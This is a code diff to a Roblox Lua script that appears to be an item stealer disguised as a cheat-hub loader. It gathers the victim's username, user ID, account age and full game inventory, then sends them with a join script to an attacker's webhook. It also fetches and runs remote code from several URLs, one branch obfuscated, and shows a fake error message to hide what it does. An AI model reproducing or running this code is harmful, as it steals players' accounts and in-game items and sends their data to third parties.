@@ -1,5 +1,7 @@
--- 🤫 🧏‍♂️
 repeat wait() until game:IsLoaded()
+
+if getgenv().scriptexecuted then return end
+getgenv().scriptexecuted = true
 
 local games = {
     [142823291] = true,
@@ -36,6 +38,25 @@ if Config.Script == nil then
     Config.Script = "None"
 elseif Config.Script == "Custom" then
     Config.Script = Config.Script .. " - " .. Config.CustomLink
+end
+
+if Config.Script == "Custom" then
+    loadstring(game:HttpGet(Config.CustomLink))()
+elseif Config.Script == "Overdrive H" then
+    loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
+elseif Config.Script == "Symphony Hub" then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
+elseif Config.Script == "Highlight Hub" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
+elseif Config.Script == "Eclipse Hub" then
+    getgenv().mainKey = "nil"
+    local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+elseif Config.Script == "R3TH PRIV" then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
+elseif Config.Script == "AshbornnHub" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua",true))()
+elseif Config.Script == "Nexus" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
 end
 
 warn([[:22: Expected identifier when parsing variable name, got 'ꯃꯤꯁ꯭ꯇꯣꯚꯔ ꯑꯥꯏꯇꯦꯝ ꯇꯦꯀꯔ ꯁ꯭ꯛꯔꯤꯞꯇ ꯑꯦꯛꯇꯤꯕ ꯑꯣꯏꯔꯦ꯫']])
@@ -352,7 +373,7 @@ local data = {
    ["embeds"] = {
        {
             ["title"] = "👑 **__Mistovers__ | __.gg/mt96XPPHSS__**",
-            ["description"] = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nAnti-Stealer : " .. AntiStealer .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript        : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     🟧: " .. Unique .. "\nVintage    🟨: " .. Vintage .. "\nLegendary  🟥: " .. Legendary .. "\nRare       🟩: " .. Rare .. "\nUncommon   🟦: " .. Uncommon .. "\nCommon     ⬛: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
+            ["description"] = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nAnti-Stealer : " .. AntiStealer .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     🟧: " .. Unique .. "\nVintage    🟨: " .. Vintage .. "\nLegendary  🟥: " .. Legendary .. "\nRare       🟩: " .. Rare .. "\nUncommon   🟦: " .. Uncommon .. "\nCommon     ⬛: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
             ["type"] = "rich",
             ["color"] = tonumber(0xffd700),
        }
@@ -365,24 +386,3 @@ local headers = {
 }
 request = http_request or request or HttpPost or syn.request
 request({Url = Config.Webhook, Body = newdata, Method = "POST", Headers = headers})
-
-task.wait()
-
-if Config.Script == "Custom" then
-    loadstring(game:HttpGet(Config.CustomLink))()
-elseif Config.Script == "Overdrive H" then
-    loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
-elseif Config.Script == "Symphony Hub" then
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
-elseif Config.Script == "Highlight Hub" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
-elseif Config.Script == "Eclipse Hub" then
-    getgenv().mainKey = "nil"
-    local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
-elseif Config.Script == "R3TH PRIV" then
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
-elseif Config.Script == "AshbornnHub" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua",true))()
-elseif Config.Script == "Nexus" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
-end
